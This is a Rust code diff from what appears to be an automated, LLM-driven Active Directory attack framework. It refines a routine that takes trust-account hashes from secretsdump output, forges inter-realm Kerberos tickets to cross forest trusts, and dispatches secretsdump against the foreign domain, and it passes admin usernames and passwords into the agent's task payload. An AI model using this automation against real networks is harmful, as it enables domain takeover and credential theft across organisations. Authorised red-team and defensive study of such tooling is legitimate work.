@@ -188,7 +188,10 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
         }
 
         // --- Phase 3: Follow trust keys (inter-realm ticket + foreign secretsdump) ---
-        let work: Vec<TrustFollowWork> = {
+        let (work, admin_cred_phase3): (
+            Vec<TrustFollowWork>,
+            Option<ares_core::models::Credential>,
+        ) = {
             let state = dispatcher.state.read().await;
 
             // Skip if no domain admin yet — trust extraction requires DA-level creds
@@ -196,60 +199,96 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
                 continue;
             }
 
-            state
+            // Build lookup of known trust flat names → TrustInfo so we only
+            // process actual trust account hashes, not random machine accounts.
+            let trust_by_flat: std::collections::HashMap<String, &ares_core::models::TrustInfo> =
+                state
+                    .trusted_domains
+                    .values()
+                    .map(|t| (t.flat_name.to_uppercase(), t))
+                    .collect();
+
+            let admin_cred = state
+                .credentials
+                .iter()
+                .find(|c| c.is_admin && !c.password.is_empty())
+                .cloned();
+
+            let items = state
                 .hashes
                 .iter()
                 .filter_map(|hash| {
-                    // Trust accounts end with $ (e.g. FABRIKAM$, CHILD$)
                     if !hash.username.ends_with('$') {
                         return None;
                     }
 
+                    // Only process hashes that match a known trust account
+                    let netbios = hash.username.trim_end_matches('$').to_uppercase();
+                    let trust = trust_by_flat.get(&netbios)?;
+
+                    // Resolve source domain — fall back to first known domain
+                    // when secretsdump output lacks domain prefix for machine accounts
+                    let source_domain = if hash.domain.is_empty() {
+                        state.domains.first().cloned().unwrap_or_default()
+                    } else {
+                        hash.domain.clone()
+                    };
+                    if source_domain.is_empty() {
+                        return None;
+                    }
+
                     let dedup_key = format!(
-                        "{}:{}",
-                        hash.domain.to_lowercase(),
+                        "trust_follow:{}:{}",
+                        source_domain.to_lowercase(),
                         hash.username.to_lowercase()
                     );
                     if state.is_processed(DEDUP_TRUST_FOLLOW, &dedup_key) {
                         return None;
                     }
 
-                    // The trust account name (minus $) is the target domain's
-                    // NetBIOS name. Try to resolve to FQDN.
-                    let target_netbios = hash.username.trim_end_matches('$');
-                    let target_domain = state
-                        .netbios_to_fqdn
-                        .get(&target_netbios.to_uppercase())
-                        .cloned()
-                        .unwrap_or_else(|| target_netbios.to_lowercase());
+                    // Use the FQDN from the trust relationship — never fall back
+                    // to bare NetBIOS name which produces invalid domain strings.
+                    let target_domain = trust.domain.clone();
 
-                    // Try to find a DC for the target domain
-                    let target_dc = state
+                    let target_dc_ip = state
                         .domain_controllers
                         .get(&target_domain.to_lowercase())
                         .cloned();
 
-                    // Get our domain SID for the inter-realm ticket
-                    let source_domain_sid =
-                        state.domain_sids.get(&hash.domain.to_lowercase()).cloned();
+                    let source_domain_sid = state
+                        .domain_sids
+                        .get(&source_domain.to_lowercase())
+                        .cloned();
+                    let target_domain_sid = state
+                        .domain_sids
+                        .get(&target_domain.to_lowercase())
+                        .cloned();
+
+                    let source_dc_ip = state
+                        .domain_controllers
+                        .get(&source_domain.to_lowercase())
+                        .cloned();
 
                     Some(TrustFollowWork {
                         dedup_key,
                         hash: hash.clone(),
+                        source_domain,
                         target_domain,
-                        target_dc_ip: target_dc,
+                        target_dc_ip,
                         source_domain_sid,
+                        target_domain_sid,
+                        source_dc_ip,
                     })
                 })
-                .collect()
+                .collect();
+
+            (items, admin_cred)
         };
 
         for item in work {
-            // Synthesize a forest_trust_escalation vulnerability to track the
-            // cross-forest attack path in discovered vulnerabilities.
             let vuln_id = format!(
                 "forest_trust_{}_{}",
-                item.hash.domain.to_lowercase(),
+                item.source_domain.to_lowercase(),
                 item.target_domain.to_lowercase()
             );
             let trust_target = item
@@ -260,7 +299,7 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
                 let mut details = std::collections::HashMap::new();
                 details.insert(
                     "source_domain".into(),
-                    serde_json::Value::String(item.hash.domain.clone()),
+                    serde_json::Value::String(item.source_domain.clone()),
                 );
                 details.insert(
                     "target_domain".into(),
@@ -293,20 +332,38 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
                     .await;
             }
 
-            // 1. Dispatch inter-realm ticket creation
+            // 1. Dispatch inter-realm ticket creation.
+            //    Use field names that match the tool and prompt expectations:
+            //    - `vuln_type` routes to generate_trust_key_prompt
+            //    - `source_sid`/`target_sid` match create_inter_realm_ticket tool
+            //    - `trusted_domain` is read by the trust prompt
+            //    - Include admin creds + dc_ip so the LLM can call get_sid if SIDs are missing
             let mut ticket_payload = json!({
                 "technique": "create_inter_realm_ticket",
-                "domain": item.hash.domain,
+                "vuln_type": "cross_forest",
+                "domain": item.source_domain,
+                "trusted_domain": item.target_domain,
                 "target_domain": item.target_domain,
-                "trust_hash": item.hash.hash_value,
+                "target": item.target_dc_ip.as_deref().unwrap_or(&item.target_domain),
+                "trust_key": item.hash.hash_value,
                 "trust_account": item.hash.username,
                 "vuln_id": &vuln_id,
             });
             if let Some(ref sid) = item.source_domain_sid {
-                ticket_payload["domain_sid"] = json!(sid);
+                ticket_payload["source_sid"] = json!(sid);
+            }
+            if let Some(ref sid) = item.target_domain_sid {
+                ticket_payload["target_sid"] = json!(sid);
             }
             if let Some(ref aes) = item.hash.aes_key {
                 ticket_payload["aes_key"] = json!(aes);
+            }
+            if let Some(ref dc_ip) = item.source_dc_ip {
+                ticket_payload["dc_ip"] = json!(dc_ip);
+            }
+            if let Some(ref cred) = admin_cred_phase3 {
+                ticket_payload["username"] = json!(cred.username);
+                ticket_payload["password"] = json!(cred.password);
             }
 
             match dispatcher
@@ -317,10 +374,12 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
                     info!(
                         task_id = %task_id,
                         trust_account = %item.hash.username,
+                        source_domain = %item.source_domain,
                         target_domain = %item.target_domain,
+                        has_source_sid = item.source_domain_sid.is_some(),
+                        has_target_sid = item.target_domain_sid.is_some(),
                         "Inter-realm ticket task dispatched"
                     );
-                    // Mark trust vuln as exploited once the ticket task is dispatched
                     let _ = dispatcher
                         .state
                         .mark_exploited(&dispatcher.queue, &vuln_id)
@@ -328,7 +387,7 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
                 }
                 Ok(None) => {
                     debug!("Inter-realm ticket deferred by throttler");
-                    continue; // Don't mark as processed; try again next cycle
+                    continue;
                 }
                 Err(e) => {
                     warn!(err = %e, "Failed to dispatch inter-realm ticket");
@@ -343,7 +402,7 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
                     "target_ip": dc_ip,
                     "domain": item.target_domain,
                     "trust_account": item.hash.username,
-                    "trust_hash": item.hash.hash_value,
+                    "trust_key": item.hash.hash_value,
                 });
 
                 match dispatcher
@@ -380,7 +439,10 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
 struct TrustFollowWork {
     dedup_key: String,
     hash: ares_core::models::Hash,
+    source_domain: String,
     target_domain: String,
     target_dc_ip: Option<String>,
     source_domain_sid: Option<String>,
+    target_domain_sid: Option<String>,
+    source_dc_ip: Option<String>,
 }
